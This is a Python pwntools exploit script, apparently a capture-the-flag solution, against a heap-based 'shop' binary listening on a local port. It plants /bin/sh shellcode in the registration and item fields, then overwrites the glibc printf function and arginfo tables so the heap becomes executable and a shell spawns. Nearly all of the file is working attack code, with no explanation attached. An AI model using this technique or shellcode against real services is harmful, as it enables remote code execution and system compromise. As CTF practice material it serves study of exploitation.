#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

REMOTE = True

BINARY = "./shop"

make_heap_exec = b'4205600' # Address of _dl_make_heap_executable
offset = b'4925936'
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

if REMOTE:
    r = remote('127.0.0.1', 33063)
else:
    r = process(BINARY)


def register(username, password):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', username)
    r.sendlineafter(b': ', password)


def login(username, password):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', username)
    r.sendlineafter(b': ', password)


def sell(name, price, size=0):
    if size == 0:
        size = len(name) + 16

    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(size).encode('utf-8'))
    r.sendlineafter(b': ', name)
    r.sendlineafter(b': ', price)


def change_price(idx, price):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b': ', str(idx).encode('utf-8'))
    r.sendlineafter(b': ', price)


def exploit():
    register(shellcode, shellcode)
    login(shellcode, shellcode)

    for i in range( 0, 67 ):
        sell(shellcode, make_heap_exec)

    # Rewrite __printf_function_table
    sell(b'abcd', offset)

    # Rewrite __printf_arginfo_table
    change_price(67, b'0')
    sell(b'a', offset, 1024)

    # Return valid address of printf_function_table
    change_price(67, offset)

    # Invoke shell
    r.sendlineafter(b'> ', b'7')
    r.interactive()


if __name__ == "__main__":
    exploit()
